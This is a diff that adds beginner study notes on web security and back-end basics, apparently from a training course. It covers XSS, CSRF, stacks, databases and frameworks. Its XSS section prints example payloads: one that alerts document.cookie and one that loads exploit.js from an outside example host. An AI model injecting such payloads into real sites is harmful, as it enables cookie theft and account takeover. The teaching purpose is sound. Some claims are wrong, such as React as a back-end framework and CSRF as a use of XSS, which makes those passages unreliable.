@@ -121,3 +121,115 @@ JavaScript is a language often used in the front-end of a browser.
 In the top example, when the button of id "button1" is pressed, the text of the button changes to "Changed Text!"
 
 More advanced web applications use more than pure JavaScript: frameworks have been developed (like Angular, React, Vue, jQuery)
+
+## Sensitive Data Exposure
+
+There's sometimes useful information when you open the source code of a website (comments, credentials, etc).
+
+## HTML Injection
+
+HTML injection is when you put arbitrary HTML onto a webpage, usually when there is unsanitized user input. For example, we can test it by injecting `<style>` code into it, for example, which can change the way the webpage looks
+
+```
+<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
+```
+
+## XSS
+XSS, or cross site scripting, is the injection of JavaScript code into a web application or website. There are 3 main types.
+
+![web-intro-6](intro-to-web-6.png)
+
+Reflected can be in a search bar (returns to client directly), stored can be in a comment (stored in a web page or database, and loads when the page is accessed) or DOM(when we directly write code to modify the document object model). PortSwigger has great documentation on web security XSS.
+
+`#"><img src=/ onerror=alert(document.cookie)>`
+
+The above DOM xss should generate an alert with our cookie value, a neat POC.
+
+## CSRF
+
+CSRF or cross-site request forgery attempts to use XSS to allow an unauthenticated user to make calls with the authentication of some other user, usually the web server that is being attacked. For example, we can used stored XSS in a comment to create a payload that changes a password, that is executed whenever the web page is loaded.
+
+`"><script src=//www.example.com/exploit.js></script>`
+
+The above payload utilizes HTML injection, first by closing out the tag, and adding a script tag. This will load and execute whatever JavaScript is contained at www.example.com/exploit.js.
+
+Sanitization (cleaning unexpected or unusual characters out of inputs, like ;<>.,/) and Validation (making sure input is valid) are two methods of mitigating and preventing these vulnerabilities.
+
+# Back-End Servers
+
+Three common components of back-end servers are: web servers (apache2), databases (mySQL), and frameworks (react.JS)
+
+```
+LAMP 	Linux, Apache, MySQL, and PHP.
+
+WAMP 	Windows, Apache, MySQL, and PHP.
+
+WINS 	Windows, IIS, .NET, and SQL Server
+
+MAMP 	macOS, Apache, MySQL, and PHP.
+
+XAMPP 	Cross-Platform, Apache, MySQL, and PHP/PERL.
+```
+
+## Web Servers
+
+Common HTTP Codes
+
+![web-intro-7](intro-to-web-7.png)
+
+Web servers accept more than text requests: we can send them JSON data, or upload binary data and transfer files.
+
+Common types of web servers are apache (HTTPD), NGINX, IIS, and so on
+
+## Databases
+
+Used to store content and data, certain trade offs: speed, size, scalability, and cost.
+
+Relational databases are one type of database, and a common software is SQL. Relational databases link pieces of data to each other across tables. 
+
+
+```
+MySQL 	The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
+
+MSSQL 	Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers
+
+Oracle 	A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses
+
+PostgreSQL 	Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design
+```
+
+Non-relational databases tend to be scalable and flexible, and include the common storage models of: 
+```
+
+    Key-Value
+    Document-Based
+    Wide-Column
+    Graph
+```
+![web-intro-8](intro-to-web-8.png)
+
+## Development Framework and APIS
+
+```
+    Laravel (PHP): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
+
+    Express (Node.JS): used by PayPal, Yahoo, Uber, IBM, and MySpace.
+
+    Django (Python): used by Google, YouTube, Instagram, Mozilla, and Pinterest.
+
+    Rails (Ruby): used by GitHub, Hulu, Twitch, Airbnb, and even Twitter in the past.
+```
+
+APIs a way of sending and recieving data to and from databases, servers, etc.
+
+SOAP a common type of API, shares data through XML format.
+
+## Common Web Vulnerabilities
+
+Broken Authentication/Access Control
+
+Malicious File Upload (PHP Backdoor)
+
+Command Injection,
+
+SQL injection,
